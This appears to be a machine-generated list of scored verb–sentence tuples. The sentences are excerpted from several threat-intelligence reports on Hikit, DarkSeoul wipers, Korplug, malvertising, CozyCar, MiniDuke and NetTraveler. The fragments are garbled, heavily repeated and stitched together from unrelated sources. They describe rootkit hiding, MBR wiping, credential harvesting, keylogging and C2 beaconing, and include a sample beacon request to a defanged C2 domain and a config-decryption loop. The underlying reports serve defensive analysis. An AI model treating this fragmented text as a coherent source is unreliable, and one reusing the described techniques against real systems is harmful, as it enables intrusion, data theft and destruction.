new\nchannel')(0.05263157894736842, 'hide', ' The Gen 2 Driver is a simpler system driver that acts as a rootkit to hide processes, registry\nkeys and network connections associated with Gen 2 activity on the victim’s system')(0.8571428571428571, 'create', ' The DLL will\ncreate a new service (e.g')(0.72, 'retain', ' While the communication models shifted dramatically between Gen 1 and Gen 2, both\ngenerations of Hikit retain the same basic RAT function consisting of remote command shell, file\nmanagement, network proxy and port forwarding')(0.5, 'hooks', ' It does not attempt to obfuscate its functionality from static analysis\nand it hooks a minimum number of kernel API functions in order to hide different pieces of information')(0.4166666666666667, 'contains', '\n\nBoth Gen 1 and Gen 2 sub-families of Hikit consist of a main DLL (referred to as “the DLL”) that\ncontains the RAT functionality; a kernel driver (referred to as “the Driver”) with Gen 2 also employs an\nadditional component: a loader executable')(0.9375, 'creates', ' To activate\nthe rootkit, the RAT functionality code creates a service with the driver in the %TEMP%\t\n \xa0directory as the\nexecutable for the service')(0.4827586206896552, 'generate', '\n        StartServer                                                                                                                                                               Activates the Gen 2 RAT (called from a DLL Loader)\n        StopServer                                                                                                                                                                Stops the Gen 2 RAT (called from a DLL Loader)\n</table>\n\nMatrixMain\t\nand\t\nStartServer\t\nboth ultimately generate a new thread (using the POSIX API function\t\n\nbeginthreadex\t\ninstead of the more common\t\nCreateThread) that contains the main loop of the Gen\n2 RAT functionality')(0.6190476190476191, 'intercepts', ' The Driver intercepts any and all network communication that traverses the Windows\nnetwork stack and potentially removes the data from the network stack under very specific conditions')(0.6153846153846154, 'providing', ' This allows an attacker to establish several Gen2 infections within a victim’s\ninfrastructure and if outbound connectivity is prohibited for any of the infected machines, the attacker\ncan route commands to the pseudo-isolated infections through accessible infected machines providing\na high level of persistence to the malware')(0.65, 'listens', ' The Gen 1 Driver listens to network traffic arriving at the local\nnetwork interface and waits for a specific trigger string')(0.2, 'run', '\nexe and conime.exe to attempt to connect remote servers, upload and run the bash script\n~pr1.tmp')(0.2, 'upload', '\nexe and conime.exe to attempt to connect remote servers, upload and run the bash script\n~pr1.tmp')(0.3, 'connect', '\nexe and conime.exe to attempt to connect remote servers, upload and run the bash script\n~pr1.tmp')(0.9, 'searches', '\n</section>\n<section>\n<heading>Installation</heading>\n\nWhen executed it creates the following files in the affected user’s %Temp% directory:\n<list>\n    •   alg.exe: A legitimate binary used to open SSH connections with remote servers\n        MD5 e45cd9052dd3dd502685dfd9aa2575ca\u2028\n        Size: 166,912 bytes\n    •   conime.exe: A legitimate binary used to open SSH connections with remote servers\n        MD5: 6a702342e8d9911bde134129542a045b\u2028\n        Size: 153,600 bytes\n    •   ~pr1.tmp: Payload - A destructive bash script\n        MD5: dc789dee20087c5e1552804492b042cd\n        Size: 1,186 bytes\u2028\n        Also known as/detected as: \u2028\n                 KillMBR-FBIA (McAfee)\n                 Trojan:SH/Kofornix.A (Microsoft)\n                 Trojan.Jokra (Symantec)\n    •   AgentBase.exe: Payload - Win32 wiper component (see details below)\n        MD5: db4bbdc36a78a8807ad9b15a562515c4\u2028\n        Size: 24,576 \u2028\n</list>\n</section>\n<section>\n<heading>Payload—attempts to connect to remote servers and upload a destructive bash script \u2028</heading>\n\nAfter determining the location of user profile directories on the affected computer, the malware\nsearches these directories for configuration files and directories that may be associated with the\nconnection manager clients mRemote and SecureCRT')(0.7777777777777778, 'overwrite', ' The malware attempted to disable AhnLab and Hauri AV antivirus products then\nproceeded to overwrite the master boot record (MBR)')(1.0, 'disable', ' The malware attempted to disable AhnLab and Hauri AV antivirus products then\nproceeded to overwrite the master boot record (MBR)')(0.4444444444444444, 'target', ' The upload server vector included a time-based logic bomb that allowed the wiper\nto target a large number of systems, on a set time and date, with full permissions on all of the\ntargeted systems.<fn>383</fn>\n\nAccording to CrowdStrike, the wiper malware was dropped on the systems as AgentBase.exe')(0.45454545454545453, 'used', ' IssueMakersLab found that these actors consistently\nused the same 16-digit password for file compression, the same stage 1 C2 protocol, the same\ncollection keywords and encryption keys, and the same development path.<fn>343</fn> According to South\nKorea’s Korea Internet and Security Agency, the North Korean IP address 175.45.178.xx was\nfound scanning South Korean routes the month before the attacks,<fn>344</fn> and the same IP was\nreportedly logged as accessing one of the targets 13 times.<fn>345</fn> Details of the March 20 attack also\nsuggested possible ties to China')(0.7142857142857143, 'reads', ' \u2028\n\nIf an mRemote installation is located, the dropper reads the configuration file and checks if there’s\na NODE that is defined with “Username=root”, “Protocol=SSH”, and a password that is not blank')(0.8461538461538461, 'downloaded', '\n\nAccording to CrowdStrike, a third malware component downloaded an IRC RAT from various\ncompromised websites')(0.6, 'extracts', ' If\n\x0cthose conditions are satisfied it extracts the information')(0.75, 'search', ' While the malware was clearly intended to search for and exfiltrate certain\ntypes of data, its true impact on the targets was never revealed')(0.2727272727272727, 'wiping', ' The attack was capable of wiping both\nLinux and Windows machines.<fn>341</fn> McAfee found that these attacks were the culmination of the\nmalware campaign they dubbed “Operation Troy”.<fn>342</fn>\n\nA report from IssueMakersLab tied the actors responsible for the March 20, 2013 attacks to cyber\nattack activity occurring as early as 2007')(0.25, 'spread', ' AlienVault suspected the Chinese exploit kit GonDad was used to\nspread the malware, and the Korean domains serving the malware were registered using a\nChinese email address')(0.5263157894736842, 'wipe', ' \u2028\n\nThe bash script initially checks which UNIX it is running on (of HP-UX, SunOS, Linux, or AIX) and\nthen attempts to wipe the /kernel, /usr /etc and /home directories, thus')(0.4166666666666667, 'performed', " The\nwiper used the Windows utility 'taskkill' to kill the processes pasvc.exe and clisvc.exe, which are\nthe main processes for the Ahnlab and Hauri antivirus applications.<fn>384</fn> <fn>385</fn> The wiper then\nperformed system reconnaissance, gathering drive information and operating system version")(0.6666666666666666, 'gathering', " The\nwiper used the Windows utility 'taskkill' to kill the processes pasvc.exe and clisvc.exe, which are\nthe main processes for the Ahnlab and Hauri antivirus applications.<fn>384</fn> <fn>385</fn> The wiper then\nperformed system reconnaissance, gathering drive information and operating system version")(0.29411764705882354, 'kill', " The\nwiper used the Windows utility 'taskkill' to kill the processes pasvc.exe and clisvc.exe, which are\nthe main processes for the Ahnlab and Hauri antivirus applications.<fn>384</fn> <fn>385</fn> The wiper then\nperformed system reconnaissance, gathering drive information and operating system version")(0.5833333333333334, 'deleted', '\nDepending on the OS used, the wiper recursively deleted files on the file system, deleting the\nWindows folder last')(0.6875, 'included', ' The impact of the March 20 attacks included\ndisruption of service at financial institutions and data deletion')(0.3333333333333333, 'were', ' In April 2012, the regime reportedly listed\n\n<box>According to statements\nfrom the South Korean\ngovernment, North\nKorea’s Lab 110 were the\nactors behind the\nDarkSeoul malware\nattacks.</box>\n\n<footnote>\n330\n    http://edition.cnn.com/2014/07/02/world/asia/south-korea-xi-visit/index.html?hpt=hp_bn7\n331\n    http://mobile.nytimes.com/blogs/sinosphere/2014/07/07/q-and-a-john-delury-on-chinese-south-korean-ties/?smid=tw-share\n332\n    http://www.globalpost.com/dispatch/news/yonhap-news-agency/140825/n-korea-urges-un-action-against-s-korea-us-military-drill\n333\n    http://www.theguardian.com/world/2009/jul/11/south-korea-blames-north-korea-cyber-attacks\n334\n    http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/2\n335\n    http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674?\n336\n    http://motherboard.vice.com/blog/the-dark-seoul-hackers-were-after-south-korean-military-secrets\n337\n    http://blogs.mcafee.com/wp-content/uploads/2011/07/McAfee-Labs-10-Days-of-Rain-July-2011.pdf\n338\n    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war\n339\n    http://www.nytimes.com/2013/03/21/world/asia/south-korea-computer-network-crashes.html?pagewanted=all&_r=1&\n</footnote>\n\x0cthose entities as attack targets.<fn>340</fn> The malware used in the March 20, 2013 attacks were wiper\nmalware')(0.18181818181818182, 'communicate', '\n\x0cMalware tries to communicate with')(0.6363636363636364, 'builds', "\n\n\n\n\nIt's very time-consuming to understand the functionality of the dll as it decrypts and builds its own\nruntime import table to hinder the analysis")(0.5454545454545454, 'transmits', ' The module\ntransmits the collected information in the body of the POST request and gets new commands from the\nserver’s response')(0.8, 'gets', ' The module\ntransmits the collected information in the body of the POST request and gets new commands from the\nserver’s response')(0.5, 'read', ' When there is a file waiting for upload (usually,\nthis is file that contains the results of the previously received and executed command), it is read\nfrom disk and uploaded to the server instead of the system information')(0.5555555555555556, 'uploaded', ' When there is a file waiting for upload (usually,\nthis is file that contains the results of the previously received and executed command), it is read\nfrom disk and uploaded to the server instead of the system information')(1.0, 'transmits', ' It collects most of the available information about the\nsystem, transmits it to the C&C server and executes the commands it receives back')(1.0, 'collects', ' It collects most of the available information about the\nsystem, transmits it to the C&C server and executes the commands it receives back')(0.75, 'executes', ' It collects most of the available information about the\nsystem, transmits it to the C&C server and executes the commands it receives back')(0.6, 'issuing', '\n\n\n<figure></figure>\n\n                                      <caption>C&C server communication cycle</caption>\n\n\n<noncontent>TLP: Green                                               For any inquire please contact intelreports@kaspersky.com\n\x0c                                                                                                           5</noncontent>\n\nThe module uses Wininet API functions for issuing HTTP POST requests to the server')(0.8823529411764706, 'registers', ' If failed, tries to write to the file f:\\keyhook.log\n\nEach time the keylogger starts, it appends the following header to the log file:\n\n\n--------------------------------------------------------------------------------\nNew Session: %fully qualified computer name% %timestamp%\n--------------------------------------------------------------------------------\n\n\nIt then creates a hidden console window and registers its only export _LowLevelKeyboardProc@12\nas a hook procedure for low-level keyboard input events (WH_KEYBOARD_LL hook)')(0.4166666666666667, 'controls', '\nThe configuration is an INI file that controls the further behavior of the module')(0.375, 'Creates', ' Keylogger module</heading>\n\nFile name: varies\nMD5: a3cbf6179d437909eb532b7319b3dafe\nCompilation timestamp: 2012.10.02 10:51:50 (GMT)\nCompiler: Microsoft Visual Studio 2010\nFile format: PE32 DLL\nExports: _LowLevelKeyboardProc@12\n\n\nCreates the log file: %TEMP%\\~DFD3O8.tmp')(0.8666666666666667, 'writes', '\n\n\nThe low-level keyboard hook procedure intercepts WM_KEYDOWN, WM_KEYUP and WM_\nSYSKEYDOWN system messages and writes information about each keystroke to the log file')(0.4444444444444444, 'transmitted', '\n14.\t      Directory listing of available logical drives and of the directories:\n           •\t Desktop\n          •\t %TEMP%\n          •\t %WINDOWS%\\Temp\n</list>\n\n\nThe retrieved information is compressed using bzip2, encrypted with AES and then encoded using\nBase64 before being transmitted to the C&C server')(0.6666666666666666, 'compressed', '\n14.\t      Directory listing of available logical drives and of the directories:\n           •\t Desktop\n          •\t %TEMP%\n          •\t %WINDOWS%\\Temp\n</list>\n\n\nThe retrieved information is compressed using bzip2, encrypted with AES and then encoded using\nBase64 before being transmitted to the C&C server')(0.35714285714285715, 'gather', '\n\nIn addition to collecting files, the malware attempts to gather saved passwords, history of visited URLs,\naccount information and proxy information')(1.0, 'collecting', '\n\nIn addition to collecting files, the malware attempts to gather saved passwords, history of visited URLs,\naccount information and proxy information')(0.9, 'transfer', '\n</section>\n<section>\n<heading>Alternative Malware #1: DarkStRat</heading>\n\nA curious Remote Access Trojan, as research points to a Chinese connection but the commands it listens\nto are in Spanish (translation in English):\n<list>\n      CERRAR (close)\n      DESINSTALAR (uninstall)\n      SERVIDOR (server)\n      INFO\n      MAININFO\n      PING\n      REBOOT\n\x0c      POWEROFF\n      PROC\n      KILLPROC\n      VERUNIDADES (see units)\n      LISTARARCHIVOS (list files)\n      EXEC\n      DELFILE\n      DELFOLDER\n      RENAME\n      MKDIR\n      CAMBIOID (change ID)\n      GETFILE/SENDFILE/RESUMETRANSFER\n      SHELL\n      SERVICIOSLISTAR (list service)\n      INICIARSERVICIO (start service)\n      DETENERSERVICIO (stop service)\n      BORRARSERVICIO (erase service)\n      INSTALARSERVICIO (install service)\n</list>\nThe malware can manage processes and services on the infected machine, transfer files to and from the\nC&C server, run shell commands, and so on')(0.6, 'manage', '\n</section>\n<section>\n<heading>Alternative Malware #1: DarkStRat</heading>\n\nA curious Remote Access Trojan, as research points to a Chinese connection but the commands it listens\nto are in Spanish (translation in English):\n<list>\n      CERRAR (close)\n      DESINSTALAR (uninstall)\n      SERVIDOR (server)\n      INFO\n      MAININFO\n      PING\n      REBOOT\n\x0c      POWEROFF\n      PROC\n      KILLPROC\n      VERUNIDADES (see units)\n      LISTARARCHIVOS (list files)\n      EXEC\n      DELFILE\n      DELFOLDER\n      RENAME\n      MKDIR\n      CAMBIOID (change ID)\n      GETFILE/SENDFILE/RESUMETRANSFER\n      SHELL\n      SERVICIOSLISTAR (list service)\n      INICIARSERVICIO (start service)\n      DETENERSERVICIO (stop service)\n      BORRARSERVICIO (erase service)\n      INSTALARSERVICIO (install service)\n</list>\nThe malware can manage processes and services on the infected machine, transfer files to and from the\nC&C server, run shell commands, and so on')(1.0, 'run', '\n</section>\n<section>\n<heading>Alternative Malware #1: DarkStRat</heading>\n\nA curious Remote Access Trojan, as research points to a Chinese connection but the commands it listens\nto are in Spanish (translation in English):\n<list>\n      CERRAR (close)\n      DESINSTALAR (uninstall)\n      SERVIDOR (server)\n      INFO\n      MAININFO\n      PING\n      REBOOT\n\x0c      POWEROFF\n      PROC\n      KILLPROC\n      VERUNIDADES (see units)\n      LISTARARCHIVOS (list files)\n      EXEC\n      DELFILE\n      DELFOLDER\n      RENAME\n      MKDIR\n      CAMBIOID (change ID)\n      GETFILE/SENDFILE/RESUMETRANSFER\n      SHELL\n      SERVICIOSLISTAR (list service)\n      INICIARSERVICIO (start service)\n      DETENERSERVICIO (stop service)\n      BORRARSERVICIO (erase service)\n      INSTALARSERVICIO (install service)\n</list>\nThe malware can manage processes and services on the infected machine, transfer files to and from the\nC&C server, run shell commands, and so on')(0.4666666666666667, 'used', ' For example, the\nKorplug RAT (a.k.a .PlugX) is a well-known toolkit associated with Chinese APT groups and used in a\nlarge number of targeted attacks since 2012')(0.0625, 'harvesting', '\n</section>\n<section>\n<heading>Alternative Malware #2: File Stealer</heading>\n\nThis malware, written in C, and contains several functions for harvesting files off the victim’s hard drive\naccording to criteria set in the configuration file')(0.6363636363636364, 'detected', '\n\nIn addition to collecting files, the malware attempts to gather saved passwords, history of visited URLs,\naccount information and proxy information from the following applications:\n<list>\n      Microsoft Messenger\n      Microsoft Outlook\n      Microsoft Internet Explorer\n      Mozilla Firefox\n</list>\nThe C&C domains used by this malware are:\n<list>\n\x0c      newvinta.com\n      worksware.net\n</list>\nSome samples of this file stealer detected in')(0.5714285714285714, 'stay', '\n\n<figure></figure>\n\n<list>\n      exe – a legitimate executable with a Kaspersky digital signature that would load a DLL with a\n      specific file name\n\x0c      dll – a small DLL loader that would pass execution to the Korplug raw binary code\n      dll.avp – raw Korplug binary\n</list>\nThe Korplug RAT is known to use this side-loading trick by abusing legitimate digitally signed executables\nand is a way to stay under the radar, since a trusted application with a valid signature among startup items\nis less likely to raise suspicion')(0.5384615384615384, 'use', '\n\n<figure></figure>\n\n<list>\n      exe – a legitimate executable with a Kaspersky digital signature that would load a DLL with a\n      specific file name\n\x0c      dll – a small DLL loader that would pass execution to the Korplug raw binary code\n      dll.avp – raw Korplug binary\n</list>\nThe Korplug RAT is known to use this side-loading trick by abusing legitimate digitally signed executables\nand is a way to stay under the radar, since a trusted application with a valid signature among startup items\nis less likely to raise suspicion')(0.42857142857142855, 'exploit', '\n\nThe maliciously crafted documents are RTF files that successfully exploit the CVE-2012-0158 vulnerability\nin Microsoft Word')(0.8181818181818182, 'employing', '<doc>\n<section>\n<heading>Korplug military targeted attacks: Afghanistan & Tajikistan</heading>\n\n<figure></figure>\n\n\nAfter taking a look at recent Korplug (PlugX) detections, we identified two larger scale campaigns\nemploying this well-known Remote Access Trojan')(0.2857142857142857, 'is', '                                                                                    Release Date: 10.27.2014\n</footer>\n\x0c                                                                                     \n<header>\nInvincea White Paper       8\n</header>\n\n\nFrom the VirusTotal report in Figure 5, you will see that this malware is a Trojan backdoor that would likely\nbe used to download additional malware or to provide remote persistent access to the attacker')(0.75, 'download', '                                                                                    Release Date: 10.27.2014\n</footer>\n\x0c                                                                                     \n<header>\nInvincea White Paper       8\n</header>\n\n\nFrom the VirusTotal report in Figure 5, you will see that this malware is a Trojan backdoor that would likely\nbe used to download additional malware or to provide remote persistent access to the attacker')(0.5454545454545454, 'provide', '                                                                                    Release Date: 10.27.2014\n</footer>\n\x0c                                                                                     \n<header>\nInvincea White Paper       8\n</header>\n\n\nFrom the VirusTotal report in Figure 5, you will see that this malware is a Trojan backdoor that would likely\nbe used to download additional malware or to provide remote persistent access to the attacker')(0.6666666666666666, 'delivered', ' As soon as the page loaded,\na malicious ad delivered a backdoor Trojan via a Java-based exploit')(0.3333333333333333, 'target', '\n\nNow advanced threat actors are able to target an organization directly via micro-targeted malvertising,\nbased solely on their corporate network IP range')(0.3888888888888889, 'deliver', ' For half the price of a candy bar,\nattackers have the unprecedented ability to deliver malware to you through your web browser simply\nbecause of your IP address space and your industry vertical')(0.4, 'switch', ' Threat actors create a corporate front, advertise on\ncommonly visited sites, then later switch out the landing pages for their ads to pages that host exploit\nkits, or simply create a temporary redirection from their usual content to the malicious landing page')(0.17391304347826086, 'create', ' Threat actors create a corporate front, advertise on\ncommonly visited sites, then later switch out the landing pages for their ads to pages that host exploit\nkits, or simply create a temporary redirection from their usual content to the malicious landing page')(0.625, 'does', ' By paying 65 cents to install a\nbackground web browser that does nothing but click fraud, the malvertiser is able to reap hundreds if not\nthousands of dollars in advertising referral income')(0.6428571428571429, 'copied', ' This exploit copied a fully\nfunctional version of Chrome into the Java cache directory, and that version of Chrome launched in the\nbackground and proceeded to visit websites and click on specific ad banners')(0.7, 'click', ' This exploit copied a fully\nfunctional version of Chrome into the Java cache directory, and that version of Chrome launched in the\nbackground and proceeded to visit websites and click on specific ad banners')(0.13333333333333333, 'originate', '                                                                                    Release Date: 10.27.2014\n</footer>\n\x0c                                                                                     \n<header>\nInvincea White Paper       2\n</header>\n\n<section>\n\n<heading>Executive Summary</heading>\n\nMost targeted attacks against organizations originate as spear-phish campaigns or watering hole style\nweb driveby attacks')(0.7777777777777778, 'dropped', ' In this instance, the Pubmatic server redirected to a Web\nserver in Poland that dropped the malware')(0.4, 'delivering', '                                                Release Date: 10.27.2014\n</footer>\n\x0c                                                                                    \n<header>\nInvincea White Paper       26\n</header>\n\n\n<section>\n<heading>Ransomware Campaign via Malvertising</heading>\n\nIn September and October of 2014, Invincea saw a sharp spike of malvertising delivering CryptoWall\nransomware attacks via Real Time Ad Bidding')(0.8181818181818182, 'result', ' Merely visiting any ad-supported site may result in a CryptoWall ransomware infection')(0.5714285714285714, 'delivered', ' Figure 2 shows an event tree of\nthe exploit and malware delivered from an ad by visiting Fleaflicker.com')(0.8, 'linking', ' A small fraction is malicious content linking\nto landing pages that infect users')(0.5217391304347826, 'delivering', ' We observed Real Time Ad bidding platforms, including\nOpenX, GoogleAds, Yahoo, AOL, and first-impression.com, fall victim to the ransomware malvertising\nscheme by unwittingly delivering the CryptoWall 2.0 ransomware ads')(0.6666666666666666, 'delivered', ' So how do they get money to spend on\nthese malicious campaigns?\n\nInvincea recently saw a malvertiser win a bid and delivered a Java exploit')(0.4166666666666667, 'utilizes', '\n\nCryptowall 2.0 utilizes the TOR network to hide its communications, but it quickly encrypts all local files\non the disk, and demands bitcoin payment to unlock the files')(0.7272727272727273, 'exploit', ' Legitimate ad copy is stolen, 3rd party ad networks used to distribute malware, and popular ad-\nsupported websites displaying the malicious ads that exploit unsuspecting visitors with drive-by web\nexploits')(0.125, 'used', ' Legitimate ad copy is stolen, 3rd party ad networks used to distribute malware, and popular ad-\nsupported websites displaying the malicious ads that exploit unsuspecting visitors with drive-by web\nexploits')(0.7777777777777778, 'using', ' As we\nhave detailed here, they can also be mis-appropriated unwittingly by malvertisers using these same tools\nand techniques to target companies with malware for persistent remote access in addition to traditional\nclick fraud, phishing, and identity theft')(0.42857142857142855, 'gain', '\n</section>\n\n<section>\n<heading>Real-Time Bidding Networks: How it works</heading>\n\nWe observed in Operation DeathClick that real-time ad bidding networks are being used by criminal\nenterprise to target companies with malicious content in order to gain persistent remote access')(0.71875, 'replace', ' But it is very simple to replace the redirection code\nto switch from a legitimate ad banner to a drop site that hosts an exploit kit, typically based on Java, Flash,\nSilverlight, or all three')(0.75, 'serves', ' But what if the landing pages that are\nsupposed to be ads are actually malicious PHP pages with embedded malware? The bidding and ad\nplacements work the same, but instead of seeing a flashy ad banner, the highest bidder for the placement\nserves malware')(0.7692307692307693, 'weaponized', ' And now, with the advent of real-time ad bidding, these threat actors have\nweaponized ad delivery networks to target victims based on:\n<list>\n    \uf0b7   User-Agent strings (versions of flash, OS, java and browser)\n    \uf0b7   Interest-related content (click bait articles, industry specific software or hardware, like medical\n        supplies, radar mapping software, ammunition sales, stocks forums)\n    \uf0b7   Advertising Profiles derived from cookies (someone with specific tastes, may shop for shoes,\n        handbags, cars, luxury vacations)\n    \uf0b7   Geographic region (malvertisers can target specific neighborhoods or states via geoip direct\n        advertising)\n    \uf0b7   Specific corporate IP ranges (targeted malvertising can target the public IP space of your network\n        or an Industrial Vertical)\n</list>\n\n\n\n<footer>\nInvincea, Inc')(0.8, 'dropping', ' The timeline will show that when the user replied to an email, the ads\non the Earthlink page refreshed, dropping the exploit code via Java')(0.5714285714285714, 'was', ' The event tree in Figure 10 notes that\nthis was likely a spear-phish attack')(0.14285714285714285, 'exploit', ' When they replied to an email,\na new ad was loaded on a page that attempted to exploit Java')(0.75, 'installed', ' The malware delivered came from a compromised Polish website, and\nwould have installed a generic backdoor Trojan')(0.2, 'provide', ' Since these attacks were blocked by Invincea prior to compromise of the machine\nor network, we cannot confirm the specific IP the perpetrators are after – only the Tactics, Techniques,\nand Protocols (TTPs) used which we describe herein, similar to methods used to provide backdoor access\nand command and control over compromised networks')(0.8571428571428571, 'evades', ' Unfortunately, the micro-targeting malvertising technique evades almost all\nnetwork controls and traditional endpoint anti-virus solutions')(0.8, 'dropped', '                                                                                    Release Date: 10.27.2014\n</footer>\n\x0c                                                                                     \n<header>\nInvincea White Paper       6\n</header>\n\n\n<figure></figure>\n\n                     <caption>Figure 2: Event tree for infection from Fleaflicker.com Incident</caption>\n\nThe event tree in Figure 2 taken from Invincea’s Threat Management Console shows the exploited Java\nprocess dropped a file called fvJcrgR0.exe, and that it likely came from Pubmatic, an ad delivery network\nthat allows for real time bidding to deliver ads')(0.2222222222222222, 'delivered', '\n</section>\n<section>\n<heading>Real World Examples of RTB Malvertising Captured by Invincea</heading>\n\nFigures 17 through 21 in the following are screenshots from Invincea’s Threat Management console from\nvarious RTB-based malvertising incidents with highlighted URLs for malvertising delivered via RTB ad\nbidding')(0.6153846153846154, 'serve', ' </caption>\n\nAnalysis of the secondary dll file (name matches [A-Z0-9]{1}\\.tmp) indicates that its primary function is\nto serve as a cleanup mechanism for the dropped binary')(0.09090909090909091, 'utilizes', ' [2]\n\nThis campaign, which began on July 7, 2015, appears to be targeted at government organizations and\nthink-tanks located in democratic countries [3], and utilizes compromised, legitimate websites for spear\nphishing and command and control activity')(0.625, 'responding', '\n</section>\n\n<section>\n<heading> Command handler </heading>\n\nOnce the C2 and Trojan have synchronized and can decrypt their network communications the C2 server\nwill begin responding to beacons from the Trojan with JSON blobs')(0.6923076923076923, 'issue', ' To obtain tasks, the Trojan will issue an HTTPS request to the C2 server\n(“host_scripts” in the configuration) that resembles the following example beacon:\n\nGET /mobile/viewer.php HTTP/1.1\nAccept: */*\nAccept-Language: en-US\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\nHost: www.illuminatistudios[.]net\nCookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A\nAccept-Encoding: gzip, deflate\nConnection: Keep-Alive\n\n\n\n\n   GET /mobile/viewer.php HTTP/1.1\n\n   Accept: */*\n\n   Accept-Language: en-US\n\x0c   User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\n\n   Host: www.illuminatistudios[.]net\n\n   Cookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A\n\n   Accept-Encoding: gzip, deflate\n\n   Connection: Keep-Alive\n\nThe Trojan manually creates the cookie in this HTTP request')(0.7647058823529411, 'allows', '\n\nUnit 42 analyzed the Trojan’s command handler and found several commands, as seen in Table 2, which\nallows the threat actors to carry out a full range of activities on the system')(0.9354838709677419, 'includes', '\n</section>\n\n<section>\n<heading> Malware Details </heading>\n\n<heading> The Initial Droppers: Decoy and Downloader </heading>\n\nThe current CozyCar campaign includes spear phishing emails that deliver the payload from either by a\nlink to a .zip file on a compromised website or by direct delivery as an attachment to the phish')(0.5, 'retrieve', '\n\n<figure></figure>\n\n\n<caption>Result of first obfuscation</caption>\n\n\n<figure></figure>\n\n<caption>Result of second obfuscation</caption>\n\nThe purpose of this script is to use Twitter to find a C&C and retrieve JScript code to execute')(0.75, 'use', '\n\n<figure></figure>\n\n\n<caption>Result of first obfuscation</caption>\n\n\n<figure></figure>\n\n<caption>Result of second obfuscation</caption>\n\nThe purpose of this script is to use Twitter to find a C&C and retrieve JScript code to execute')(1.0, 'applies', '\n\n<figure></figure>\n\n\nPrior to executing it, MiniDuke applies a light encoding to the script: The next images show the result of\n\x0ctwo separate obfuscations, we can see that the variables have different values')(1.0, 'deliver', ' We have since seen multiple cases where this exploit is\nused to deliver malware and one was particularly interesting as it contained a new variant of MiniDuke\n(also known as Win32/SandyEva)')(0.4375, 'retrieves', ' If the configuration data is\ndecrypted correctly, MiniDuke retrieves the Twitter page of @FloydLSchwartz in search of URLs by\nwhich to reach C&C server')(0.625, 'creates', ' The name of the file is randomly picked from the\nfollowing values (you can find this listing and those of the next screenshots on the VirusRadar description:\n\n<figure></figure>\n\n\nThe filename extension is also picked randomly from the following list:\n\n<figure></figure>\n\n\nTo persist on the infected system after reboots, the malware creates a hidden .LNK file in the “Startup”\ndirectory pointing to the modified main module')(0.625, 'persist', ' The name of the file is randomly picked from the\nfollowing values (you can find this listing and those of the next screenshots on the VirusRadar description:\n\n<figure></figure>\n\n\nThe filename extension is also picked randomly from the following list:\n\n<figure></figure>\n\n\nTo persist on the infected system after reboots, the malware creates a hidden .LNK file in the “Startup”\ndirectory pointing to the modified main module')(0.7368421052631579, 'gathering', '\n</section>\n<section>\n<heading>Operation</heading>\n\nWhen the malware is loaded by rundll32.exe and the current directory isn’t %TEMP%, the malware starts\nwith gathering the same system information as described in the “Installation” section to decrypt\nconfiguration information')(0.875, 'creating', '\n</section>\n<section>\n<heading>TwitterJS component</heading>\n\x0cThe TwitterJS module is extracted by creating a copy of the Windows DLL cryptdll.dll, injecting a block of\ncode into it and redirecting the exported functions to this code')(0.625, 'install', ' Below you can find the content of\nthe init.cmd script used by MiniDuke to install TwitterJS module onto the system')(0.2857142857142857, 'executes', ' The malware processes the\ndownloaded file in the same way as previous samples of MiniDuke: it verifies the integrity of the file using\nRSA-2048, then decrypts it, stores in a file and finally executes it')(0.3, 'starting', ' Finally this DLL is registered as the Open command when a drive is open, which has the effect of\nstarting the bot every time the user opens a disk drive')(0.8125, 'detect', '\n\nAn interesting thing about the shellcode is that before transferring control to any API function it checks\nthe first bytes of the function in order to detect hooks and debugger breakpoints which may be set by\nsecurity software and monitoring tools')(0.4444444444444444, 'proceeds', ' If either of those conditions is met the malware assumes it is run for the\nfirst time and it proceeds with its installation onto the system')(0.1, 'used', ' The final\nURL used to communicate with the C&C server looks like this: <url_start>/create.php?<rnd_param>=\n<system_info> Those tokens are derived as follows:\n<list>\n      url_start – the URL retrieved from the twitter account\n      rnd_param – randomly generated of lower case alphabet characters parameter name in the query\n\x0c      string of the URL\n      system_info – base64 encoded and encrypted system information\n</list>\nAn example of such a URL is given below:\n<figure></figure>\n\nThe payload is downloaded in the file named “fdbywu” using the urlmon!URLDownloadToFileA API:\n\n<figure></figure>\n\n\nThe downloaded payload is a fake GIF8 file containing encrypted executable')(0.8571428571428571, 'thwart', ' This is probably done to\nthwart security systems that scan at the entry points of the JScript engine')(0.6666666666666666, 'verify', ' The RSA-2048 public key to verify\nintegrity of the executable inside the GIF file is the same as in the previous version of MiniDuke')(0.36363636363636365, 'contact', ' Although\nthe backdoor is still quite similar to its previous versions, some important changes were made since last\nyear, the most notable being the introduction of a secondary component written in JScript to contact a\nC&C server via Twitter')(0.375, 'hide', ' Other known mutexes used by older and current variants include:\n<list>\n Boat-12 Is Running!\n DocHunter2012 Is Running!\n Hunter-2012 Is Running!\n NT-2012 Is Running!\n\x0c      NetTravler Is Running!\n      NetTravler2012 Is Running!\n      SH-2011 Is Running!\n      ShengHai Is Running!\n      SD2013 is Running!\n</list>\nThe malware configuration file is written to the "SYSTEM" folder (as opposed to SYSTEM32) and has a\nslightly new format compared to "older" NetTraveler samples:\n\n\n<figure></figure>\n\nFor the record, here\'s what an older NetTraveler config file looks like:\n\n<figure></figure>\n\n\nObviously, the developers behind NetTraveler have taken steps to try to hide the malware\'s configuration')(0.4166666666666667, 'installs', '\n\nIf run on a vulnerable version of Microsoft Office, it drops the main module as "net.exe" (detected by\nKaspersky Lab products as Trojan-Dropper.Win32.Agent.lifr), which in turn installs a number of\nother files')(0.30434782608695654, 'drops', '\n\nIf run on a vulnerable version of Microsoft Office, it drops the main module as "net.exe" (detected by\nKaspersky Lab products as Trojan-Dropper.Win32.Agent.lifr), which in turn installs a number of\nother files')(0.1, 'is', '\n\nThe algorithm is as follows:\n<code>\nfor (i=0;i<string_size;i++)\ndecrypted[i]=encrypted[i] - (i + 0xa);\n</code>\nOnce decrypted, the new config looks like this:\n\n<figure></figure>\n\x0cOne can easily see the command-and-control (C&C) server in the screenshot above, which 